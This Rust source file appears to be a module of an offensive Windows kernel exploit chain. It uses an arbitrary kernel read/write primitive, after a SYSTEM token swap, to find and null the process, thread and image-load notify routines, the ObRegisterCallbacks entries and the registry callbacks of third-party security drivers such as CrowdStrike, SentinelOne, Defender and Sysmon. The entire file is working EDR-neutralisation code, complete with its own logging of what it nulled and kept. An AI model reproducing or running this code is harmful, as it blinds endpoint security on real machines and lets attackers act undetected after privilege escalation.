//! EDR notification-callback neutralization built on the existing kernel R/W.
//!
//! After the SSDT-hijack token swap lands us a SYSTEM token, but before we
//! spawn the shell, we walk every kernel notification / callback list an EDR
//! can register on and null the entries that belong to third-party drivers.
//! Everything runs on top of `astra::Astra` + `kernel::vread/vwrite` — no
//! extra kernel primitive is required.
//!
//! Surfaces neutralized:
//!   1. `PspCreateProcessNotifyRoutine[]`   (via `PsSetCreateProcessNotifyRoutineEx`)
//!   2. `PspCreateThreadNotifyRoutine[]`    (via `PsSetCreateThreadNotifyRoutine`)
//!   3. `PspLoadImageNotifyRoutine[]`       (via `PsSetLoadImageNotifyRoutine`)
//!   4. `PsProcessType->CallbackList`       (ObRegisterCallbacks — PROCESS)
//!   5. `PsThreadType->CallbackList`        (ObRegisterCallbacks — THREAD)
//!   6. `CmpCallbackListHead`               (CmRegisterCallback[Ex])
//!
//! Strategy for every list: resolve the head by disassembling an exported
//! setter for a rip-relative `lea` (Ps/Cm) or by dereferencing an exported
//! `_OBJECT_TYPE*` (Ob), walk the list, resolve each callback function to its
//! owning kernel module via `PsLoadedModuleList`, and null the entry unless
//! the owner is in a short allowlist of Microsoft-shipped core modules.

use crate::astra::{is_kptr, Astra};
use crate::kernel::{vread, vread_u32, vread_u64, vwrite};
use crate::pe::{export_rva, load_image};

/// Microsoft-shipped modules whose callbacks we leave in place so the OS stays
/// coherent (integrity checks, network filter, filter manager, credential
/// provider, etc.). Anything else — CrowdStrike, SentinelOne, ESET, Sophos,
/// Defender's realtime AV filter, Sysmon, Elastic, CarbonBlack, Cortex — gets
/// its entries nulled.
const KEEP_MODULES: &[&str] = &[
    "ntoskrnl.exe", "ntkrnlmp.exe", "ci.dll", "cng.sys", "ksecdd.sys",
    "tcpip.sys",    "ndis.sys",     "fltmgr.sys", "dxgkrnl.sys",
    "ntfs.sys",     "clfs.sys",     "netio.sys",  "peauth.sys",
    "mssecflt.sys", "storport.sys",
];

const PSP_MAX: usize = 64;

// ─── PsLoadedModuleList walk ────────────────────────────────────────────────

#[derive(Clone, Debug)]
pub struct KernelModule {
    pub base: u64,
    pub size: u64,
    pub name: String,
}

fn read_unicode_string(drv: &Astra, cr3: u64, va: u64) -> Option<String> {
    let hdr = vread_u32(drv, cr3, va).ok()?;
    let len = (hdr & 0xFFFF) as usize;
    let buf_va = vread_u64(drv, cr3, va + 8).ok()?;
    if !is_kptr(buf_va) || len == 0 || len > 0x200 { return None; }
    let mut raw = vec![0u8; len];
    vread(drv, cr3, buf_va, &mut raw).ok()?;
    let u16s: Vec<u16> = raw
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    Some(String::from_utf16_lossy(&u16s))
}

/// Enumerate every `KLDR_DATA_TABLE_ENTRY` reachable from
/// `nt!PsLoadedModuleList`.
pub fn enum_loaded_modules(
    drv: &Astra, cr3: u64, nt_kbase: u64,
) -> Result<Vec<KernelModule>, String> {
    let (nt_disk, _) = load_image("ntoskrnl.exe")?;
    let rva = export_rva(nt_disk, "PsLoadedModuleList")
        .ok_or("PsLoadedModuleList not exported")?;
    let list_head = nt_kbase + rva;

    let mut out = Vec::new();
    let first = vread_u64(drv, cr3, list_head)?;
    if !is_kptr(first) {
        return Err(format!("PsLoadedModuleList first = 0x{first:X}"));
    }

    let mut cur = first;
    for _ in 0..0x400 {
        if cur == list_head { break; }
        // KLDR_DATA_TABLE_ENTRY: DllBase +0x30, SizeOfImage +0x40, BaseDllName +0x58
        let base = vread_u64(drv, cr3, cur + 0x30).unwrap_or(0);
        let size = vread_u32(drv, cr3, cur + 0x40).unwrap_or(0) as u64;
        let name = read_unicode_string(drv, cr3, cur + 0x58).unwrap_or_default();
        if is_kptr(base) && size > 0 {
            out.push(KernelModule { base, size, name });
        }
        match vread_u64(drv, cr3, cur) {
            Ok(v) if is_kptr(v) => cur = v,
            _ => break,
        }
    }
    Ok(out)
}

fn owner_of<'a>(mods: &'a [KernelModule], va: u64) -> Option<&'a KernelModule> {
    mods.iter().find(|m| va >= m.base && va < m.base + m.size)
}

fn is_ms_core(name: &str) -> bool {
    let lo = name.to_ascii_lowercase();
    KEEP_MODULES.iter().any(|k| lo == *k)
}

fn owner_name(mods: &[KernelModule], va: u64) -> String {
    owner_of(mods, va).map(|m| m.name.clone()).unwrap_or_else(|| "<unbacked>".into())
}

// ─── Setter disassembly helpers ─────────────────────────────────────────────

/// Emit every rip-relative-lea target inside `buf`, expressed as an RVA
/// relative to the image base. `base_rva` is `buf`'s RVA inside the image;
/// `img_size` is the image's `SizeOfImage`. Targets outside `[0, img_size)`
/// are dropped so a bogus disp can't overflow later arithmetic.
fn collect_lea_rip(buf: &[u8], base_rva: u64, img_size: u64) -> Vec<u64> {
    let mut out = Vec::new();
    let mut i = 0usize;
    while i + 7 <= buf.len() {
        let rex = buf[i];
        // REX.W (48h) or REX.WR (4Ch) + 8Dh (lea) + ModR/M with mod=00 rm=101 (rip-rel)
        if (rex == 0x48 || rex == 0x4C) && buf[i + 1] == 0x8D {
            let modrm = buf[i + 2];
            if modrm & 0xC7 == 0x05 {
                let disp = i32::from_le_bytes(buf[i+3..i+7].try_into().unwrap());
                let next_rip = base_rva.wrapping_add(i as u64).wrapping_add(7);
                let tgt = (next_rip as i64).wrapping_add(disp as i64);
                if tgt >= 0 && (tgt as u64) < img_size {
                    out.push(tgt as u64);
                }
                i += 7;
                continue;
            }
        }
        i += 1;
    }
    out
}

/// Enumerate every rip-relative-lea target reachable from a setter's own body
/// AND the bodies of transfers it makes (E8 CALL or E9 JMP), up to a small
/// hop budget. Handles the layered wrappers modern nt uses for the notify
/// setters (setter → PspSet* → Psp*Internal) where the array `lea` only
/// appears in the innermost frame. All arithmetic is bounds-checked against
/// `img_size` so tail-jumps to imports (whose disp resolves outside `.text`)
/// can't wrap into an out-of-image slice deref.
fn setter_lea_targets(
    nt_disk: usize, nt_disk_size: usize, setter: &str, nt_kbase: u64,
) -> Vec<u64> {
    let img_size = nt_disk_size as u64;
    let start_rva = match export_rva(nt_disk, setter) {
        Some(v) if v < img_size => v,
        _ => return vec![],
    };
    let mut targets: Vec<u64> = Vec::new();
    let mut visited: Vec<u64> = Vec::new();
    let mut frontier: Vec<u64> = vec![start_rva];

    for _hop in 0..4 {
        if frontier.is_empty() { break; }
        let mut next: Vec<u64> = Vec::new();
        for rva in frontier.drain(..) {
            if visited.contains(&rva) { continue; }
            visited.push(rva);
            if rva >= img_size { continue; }
            let remain = img_size - rva;
            let win = remain.min(0x300) as usize;
            if win < 5 { continue; }
            let buf = unsafe {
                std::slice::from_raw_parts((nt_disk + rva as usize) as *const u8, win)
            };
            for t in collect_lea_rip(buf, rva, img_size) {
                // Sanity: rebase into a kernel VA and confirm it doesn't
                // overflow the u64 space (it never will for a legitimate
                // ntoskrnl-sized image, but the guard is cheap).
                if let Some(kva) = nt_kbase.checked_add(t) {
                    targets.push(kva);
                }
            }
            // Follow only transfers that fall inside the setter's early
            // prologue (< 0x40 bytes) — that's where the tail-jump / thin
            // wrapper call to the internal helper lives. Deeper transfers
            // are conditional branches inside the body and following them
            // explodes the search space.
            let prologue_end = 0x40.min(win);
            let mut i = 0usize;
            while i + 5 <= prologue_end {
                if buf[i] == 0xE8 || buf[i] == 0xE9 {
                    let disp = i32::from_le_bytes(buf[i+1..i+5].try_into().unwrap());
                    let next_rip = rva.wrapping_add(i as u64).wrapping_add(5);
                    let tgt = (next_rip as i64).wrapping_add(disp as i64);
                    if tgt >= 0 && (tgt as u64) < img_size {
                        next.push(tgt as u64);
                    }
                    i += 5;
                    continue;
                }
                i += 1;
            }
        }
        frontier = next;
    }
    targets
}

// ─── Ps notify arrays ───────────────────────────────────────────────────────

/// Reads 64 candidate slots and accepts the array if at least one slot is a
/// valid `_EX_FAST_REF` (nonzero, block ptr masked = kernel pointer). Rejects
/// candidates that raise vread errors or contain garbage.
fn validate_ps_array(drv: &Astra, cr3: u64, va: u64) -> bool {
    let mut kptrs = 0;
    for i in 0..PSP_MAX {
        let raw = match vread_u64(drv, cr3, va + (i as u64) * 8) {
            Ok(v) => v, Err(_) => return false,
        };
        if raw == 0 { continue; }
        let block = raw & !0xFu64;
        if !is_kptr(block) { return false; }
        kptrs += 1;
    }
    kptrs > 0
}

fn wipe_ps_array(
    drv: &Astra, cr3: u64, array_va: u64, mods: &[KernelModule], label: &str,
) -> Result<usize, String> {
    let mut wiped = 0usize;
    for i in 0..PSP_MAX {
        let slot_va = array_va + (i as u64) * 8;
        let raw = vread_u64(drv, cr3, slot_va)?;
        if raw == 0 { continue; }
        let block_va = raw & !0xFu64;
        if !is_kptr(block_va) { continue; }
        // _EX_CALLBACK_ROUTINE_BLOCK { EX_RUNDOWN_REF Rundown; PVOID Function; PVOID Ctx; }
        let func = vread_u64(drv, cr3, block_va + 8).unwrap_or(0);
        if !is_kptr(func) { continue; }
        let owner = owner_name(mods, func);
        if is_ms_core(&owner) {
            println!("    [{label} #{i:02}] keep    {owner}");
            continue;
        }
        println!("    [{label} #{i:02}] NULL <- {owner}  (fn=0x{func:X})");
        if vwrite(drv, cr3, slot_va, &0u64.to_le_bytes()).is_ok() {
            wiped += 1;
        }
    }
    Ok(wiped)
}

/// Try a list of exported setter candidates. Collect all rip-relative lea
/// targets reachable from any of them (thin wrappers, tail-jumps, Ex vs
/// non-Ex — Win10/11 uses different layerings depending on the build), then
/// pick the first candidate that validates as an `_EX_FAST_REF` array.
fn resolve_ps_array(
    drv: &Astra, cr3: u64, nt_disk: usize, nt_disk_size: usize,
    nt_kbase: u64, setters: &[&str],
) -> Result<(String, u64), String> {
    let mut all: Vec<u64> = Vec::new();
    let mut tried: Vec<&str> = Vec::new();
    for s in setters {
        if export_rva(nt_disk, s).is_none() { continue; }
        tried.push(*s);
        all.extend(setter_lea_targets(nt_disk, nt_disk_size, s, nt_kbase));
    }
    all.sort_unstable();
    all.dedup();
    for va in &all {
        if validate_ps_array(drv, cr3, *va) {
            return Ok((tried.join("|"), *va));
        }
    }
    Err(format!(
        "no valid array candidate across [{}] ({} raw lea targets tried)",
        tried.join(", "), all.len()
    ))
}

/// Scan a window of kernel `.data` for `_EX_FAST_REF`-shaped arrays.
///
/// The three Ps notification arrays (`PspCreateProcessNotifyRoutine`,
/// `PspLoadImageNotifyRoutine`, `PspCreateThreadNotifyRoutine`) are declared
/// consecutively in ntoskrnl and land back-to-back in `.data` on Win10/11.
/// Once we've anchored on one via setter disassembly, bulk-reading a small
/// window past it and pattern-matching for arrays that look like
/// `_EX_FAST_REF[PSP_MAX]` finds the other two deterministically — no
/// disassembly, no BFS, no fragility.
///
/// Returns up to `count` arrays in memory order (which matches nt's
/// declaration order). One 16 KB kernel read total; all validation runs on
/// the local copy.
fn find_adjacent_ps_arrays(
    drv: &Astra, cr3: u64, anchor_va: u64, count: usize,
) -> Result<Vec<u64>, String> {
    const WINDOW: usize = 0x4000; // 16 KB after the anchor
    let arr_bytes = PSP_MAX * 8;

    let mut buf = vec![0u8; WINDOW];
    vread(drv, cr3, anchor_va, &mut buf)?;

    let looks_like_array = |slice: &[u8]| -> bool {
        let mut kptrs = 0u32;
        for j in 0..PSP_MAX {
            let off = j * 8;
            let raw = u64::from_le_bytes(slice[off..off+8].try_into().unwrap());
            if raw == 0 { continue; }
            let block = raw & !0xFu64;
            if !is_kptr(block) { return false; }   // any bogus nonzero → not an array
            kptrs += 1;
        }
        kptrs > 0
    };

    // Skip past the anchor array itself and step by 8 bytes; entries are
    // 8-byte aligned so we won't miss anything.
    let mut found: Vec<u64> = Vec::new();
    let mut i = arr_bytes;
    while i + arr_bytes <= WINDOW && found.len() < count {
        if looks_like_array(&buf[i..i+arr_bytes]) {
            found.push(anchor_va + i as u64);
            i += arr_bytes;                        // don't rescan the same region
        } else {
            i += 8;
        }
    }
    Ok(found)
}

pub fn disable_ps_notify(
    drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
) -> Result<usize, String> {
    let (nt_disk, nt_disk_size) = load_image("ntoskrnl.exe")?;
    let mut total = 0usize;

    // Anchor: PspCreateProcessNotifyRoutine.
    //
    // `PsSetCreateProcessNotifyRoutineEx` on modern nt keeps the array `lea`
    // inside its own top-level body, so setter disassembly reliably lands it.
    // The Thread and Image setters are tail-JMP wrappers whose real body
    // sits behind 2-3 layered `Psp*` internals; instead of chasing them with
    // fragile follow-heuristics we anchor on the Process array and locate
    // the other two by memory adjacency (they live back-to-back in `.data`).
    let (used, proc_arr) = resolve_ps_array(
        drv, cr3, nt_disk, nt_disk_size, nt_kbase,
        &["PsSetCreateProcessNotifyRoutineEx", "PsSetCreateProcessNotifyRoutine"],
    ).map_err(|e| format!("PspProc: {e}"))?;
    println!("[+] PspProc → array VA 0x{:X}  (via {})", proc_arr, used);
    total += wipe_ps_array(drv, cr3, proc_arr, mods, "PspProc")?;

    // The declaration order on Win10/11 24H2 is
    //   PspCreateProcessNotifyRoutine, PspLoadImageNotifyRoutine, PspCreateThreadNotifyRoutine
    // so we label them accordingly. Labels are cosmetic — the wipe operation
    // is identical for all three arrays. If a future build reorders them we
    // still null every non-MS entry in each; only the label text becomes
    // misleading.
    let adj_labels = ["PspImg ", "PspThrd"];
    let adj = find_adjacent_ps_arrays(drv, cr3, proc_arr, 2)?;
    if adj.len() < 2 {
        eprintln!(
            "[!] found {}/2 adjacent Ps arrays via memory scan — some notify surfaces \
             will not be cleared. Continuing.",
            adj.len(),
        );
    }
    for (idx, va) in adj.iter().enumerate() {
        let label = adj_labels[idx];
        println!(
            "[+] {} → array VA 0x{:X}  (adjacent scan +0x{:X} from PspProc)",
            label.trim(), va, va - proc_arr,
        );
        total += wipe_ps_array(drv, cr3, *va, mods, label)?;
    }
    Ok(total)
}

// ─── Ob callbacks (_OBJECT_TYPE.CallbackList) ───────────────────────────────

/// Locate the `CallbackList` LIST_ENTRY inside an `_OBJECT_TYPE` dynamically.
/// Robust to per-build layout drift: scans the struct for a LIST_ENTRY whose
/// invariant (empty-list self-ref, or Flink[Blink] == head) holds.
fn find_ob_callback_list_off(
    drv: &Astra, cr3: u64, object_type_va: u64,
) -> Result<u64, String> {
    for off in (0x80..0x180u64).step_by(8) {
        let head = object_type_va + off;
        let flink = vread_u64(drv, cr3, head).unwrap_or(0);
        let blink = vread_u64(drv, cr3, head + 8).unwrap_or(0);
        if flink == head && blink == head { return Ok(off); }
        if is_kptr(flink) && is_kptr(blink) {
            if vread_u64(drv, cr3, flink + 8).unwrap_or(0) == head {
                return Ok(off);
            }
        }
    }
    Err("_OBJECT_TYPE CallbackList offset not found".into())
}

/// _OB_CALLBACK_ENTRY (as used by ObRegisterCallbacks):
///   +0x00  LIST_ENTRY CallbackList
///   +0x10  OB_OPERATION Operations (u32)
///   +0x14  BOOLEAN Enabled
///   +0x18  PVOID RegistrationHandle
///   +0x20  POBJECT_TYPE ObjectType
///   +0x28  POB_PRE_OPERATION_CALLBACK  PreOperation
///   +0x30  POB_POST_OPERATION_CALLBACK PostOperation
fn wipe_ob_list(
    drv: &Astra, cr3: u64, head_va: u64, mods: &[KernelModule], label: &str,
) -> Result<usize, String> {
    let mut wiped = 0usize;
    let mut cur = vread_u64(drv, cr3, head_va)?;
    let mut budget = 128;
    while cur != head_va && budget > 0 && is_kptr(cur) {
        budget -= 1;
        let pre  = vread_u64(drv, cr3, cur + 0x28).unwrap_or(0);
        let post = vread_u64(drv, cr3, cur + 0x30).unwrap_or(0);
        let fp = if is_kptr(pre) { pre } else if is_kptr(post) { post } else { 0 };
        let owner = if fp == 0 { "<empty>".to_string() } else { owner_name(mods, fp) };
        let keep = fp == 0 || is_ms_core(&owner);
        if !keep {
            println!("    [{label} @ 0x{:X}] disable <- {}  pre=0x{:X} post=0x{:X}",
                cur, owner, pre, post);
            let _ = vwrite(drv, cr3, cur + 0x14, &[0u8]);              // Enabled = FALSE
            let _ = vwrite(drv, cr3, cur + 0x28, &0u64.to_le_bytes()); // PreOperation  = NULL
            let _ = vwrite(drv, cr3, cur + 0x30, &0u64.to_le_bytes()); // PostOperation = NULL
            wiped += 1;
        } else {
            println!("    [{label} @ 0x{:X}] keep    {}", cur, owner);
        }
        cur = match vread_u64(drv, cr3, cur) {
            Ok(v) if v == head_va || is_kptr(v) => v,
            _ => break,
        };
    }
    Ok(wiped)
}

pub fn disable_ob_callbacks(
    drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
) -> Result<usize, String> {
    let (nt_disk, _) = load_image("ntoskrnl.exe")?;
    let mut total = 0usize;
    for (sym, label) in &[("PsProcessType", "ObProc"), ("PsThreadType", "ObThrd")] {
        let rva = export_rva(nt_disk, sym)
            .ok_or_else(|| format!("{sym} not exported"))?;
        let obj_type_va = vread_u64(drv, cr3, nt_kbase + rva)?;
        if !is_kptr(obj_type_va) {
            return Err(format!("{sym} = 0x{obj_type_va:X}"));
        }
        let off = find_ob_callback_list_off(drv, cr3, obj_type_va)?;
        let head_va = obj_type_va + off;
        println!("[+] {} → _OBJECT_TYPE 0x{:X}, CallbackList @ 0x{:X} (+0x{:X})",
            sym, obj_type_va, head_va, off);
        total += wipe_ob_list(drv, cr3, head_va, mods, label)?;
    }
    Ok(total)
}

// ─── Cm registry callback list ──────────────────────────────────────────────

/// Enumerate all rip-relative lea targets in CmRegisterCallback[Ex] and pick
/// the one that dereferences as a self-consistent LIST_ENTRY head.
fn resolve_cmp_callback_head(
    drv: &Astra, cr3: u64, nt_disk: usize, nt_disk_size: usize, nt_kbase: u64,
) -> Result<u64, String> {
    for setter in ["CmRegisterCallbackEx", "CmRegisterCallback"] {
        let cands = setter_lea_targets(nt_disk, nt_disk_size, setter, nt_kbase);
        for va in cands {
            if !is_kptr(va) { continue; }
            let flink = vread_u64(drv, cr3, va).unwrap_or(0);
            let blink = vread_u64(drv, cr3, va + 8).unwrap_or(0);
            if flink == va && blink == va { return Ok(va); }
            if is_kptr(flink) && is_kptr(blink)
                && vread_u64(drv, cr3, flink + 8).unwrap_or(0) == va
            {
                return Ok(va);
            }
        }
    }
    Err("CmpCallbackListHead not resolved".into())
}

/// _CM_CALLBACK_CONTEXT_BLOCK varies slightly across builds. The `Function`
/// pointer lives somewhere in +0x18..+0x40. We identify it by scanning that
/// window for the first offset whose value is a kernel pointer belonging to a
/// loaded module.
fn wipe_cm_list(
    drv: &Astra, cr3: u64, head_va: u64, mods: &[KernelModule],
) -> Result<usize, String> {
    let mut wiped = 0usize;
    let mut cur = vread_u64(drv, cr3, head_va)?;
    let mut budget = 128;
    while cur != head_va && budget > 0 && is_kptr(cur) {
        budget -= 1;
        let mut fp = 0u64;
        let mut fp_off = 0u64;
        for off in (0x18..0x40u64).step_by(8) {
            let v = vread_u64(drv, cr3, cur + off).unwrap_or(0);
            if is_kptr(v) && owner_of(mods, v).is_some() {
                fp = v; fp_off = off; break;
            }
        }
        let owner = if fp == 0 { "<unknown>".to_string() } else { owner_name(mods, fp) };
        if fp != 0 && !is_ms_core(&owner) {
            println!("    [Cm @ 0x{:X}] NULL <- {}  (fn+0x{:X}=0x{:X})",
                cur, owner, fp_off, fp);
            let _ = vwrite(drv, cr3, cur + fp_off, &0u64.to_le_bytes());
            wiped += 1;
        } else {
            println!("    [Cm @ 0x{:X}] keep    {}", cur, owner);
        }
        cur = match vread_u64(drv, cr3, cur) {
            Ok(v) if v == head_va || is_kptr(v) => v,
            _ => break,
        };
    }
    Ok(wiped)
}

pub fn disable_cm_callbacks(
    drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
) -> Result<usize, String> {
    let (nt_disk, nt_disk_size) = load_image("ntoskrnl.exe")?;
    let head_va = resolve_cmp_callback_head(drv, cr3, nt_disk, nt_disk_size, nt_kbase)?;
    println!("[+] CmpCallbackListHead @ 0x{:X}", head_va);
    wipe_cm_list(drv, cr3, head_va, mods)
}

// ─── Public entry point ─────────────────────────────────────────────────────

pub fn disable_all(drv: &Astra, cr3: u64, nt_kbase: u64) -> Result<(), String> {
    println!("\n[*] Enumerating PsLoadedModuleList...");
    let mods = enum_loaded_modules(drv, cr3, nt_kbase)?;
    println!("[+] {} loaded kernel modules cataloged", mods.len());

    println!("\n[*] Ps notify arrays ------------------------------------------------");
    let a = disable_ps_notify(drv, cr3, nt_kbase, &mods)
        .map_err(|e| format!("Ps: {e}"))?;

    println!("\n[*] Ob callback lists -----------------------------------------------");
    let b = disable_ob_callbacks(drv, cr3, nt_kbase, &mods)
        .map_err(|e| format!("Ob: {e}"))?;

    println!("\n[*] Cm callback list ------------------------------------------------");
    let c = disable_cm_callbacks(drv, cr3, nt_kbase, &mods)
        .map_err(|e| format!("Cm: {e}"))?;

    println!("\n[+] EDR surface neutralized — Ps: {a}, Ob: {b}, Cm: {c}");
    Ok(())
}
